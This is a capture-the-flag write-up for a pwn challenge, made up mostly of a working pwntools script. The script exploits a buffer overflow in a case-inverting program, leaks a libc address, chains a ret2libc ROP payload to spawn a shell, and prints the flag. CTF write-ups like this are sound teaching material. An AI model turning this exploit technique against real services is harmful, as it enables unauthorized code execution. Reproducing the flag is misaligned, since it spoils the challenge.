# Debug 1

Author: `FlamePyromancer`

I made a program which inverts the capitalization of letters! Surely there's nothing insecure with the program, right?

## Solution

We can ROP into `debug`, get a libc leak, and then do ret2libc to get a shell.

```python
from pwn import *

elf = context.binary = ELF('./debug-1')
libc = ELF('./libc.so.6')
#libc = ELF('/lib64/libc.so.6')

context.log_level='debug'

# Converts characters in payload based on character conversion
def convert(a):
    x = bytearray(a)
    for i in range(len(x)):
        if (x[i] >= 65 and x[i] <= 90):
            x[i] = x[i]+32
        elif (x[i] >= 97 and x[i] <= 122):
            x[i] = x[i]-32
    return x

addr = elf.sym["debug"] + 0x1
payload1 = cyclic(88) + convert(p64(addr))

p = remote("localhost", 1337)

p.sendlineafter(b"3: Exit\n", b"1")
p.recvuntil(b"string (max length of 69 characters):\n")
p.send(payload1)

p.sendlineafter(b"well :) )", b"1")
p.recvuntil("libc leak: ")
system = int(p.recvline()[:-1].decode("utf-8"), 16)
print("System leak:", hex(system))
libc.address = system - libc.sym["system"]
print("libc base:", hex(libc.address))

sh = next(libc.search(b"/bin/sh\x00"))
system = libc.sym["system"]
pop_rdi = ROP(libc).find_gadget(['pop rdi', 'ret'])[0]

p.recvuntil(b"characters)!")
payload2 = cyclic(104) + p64(pop_rdi) + p64(sh) + p64(libc.sym["system"])
p.send(payload2)

p.interactive()
```

flag:
`gigem{d3bUg61ng_n3w_c0d3_a24dcfe3}`
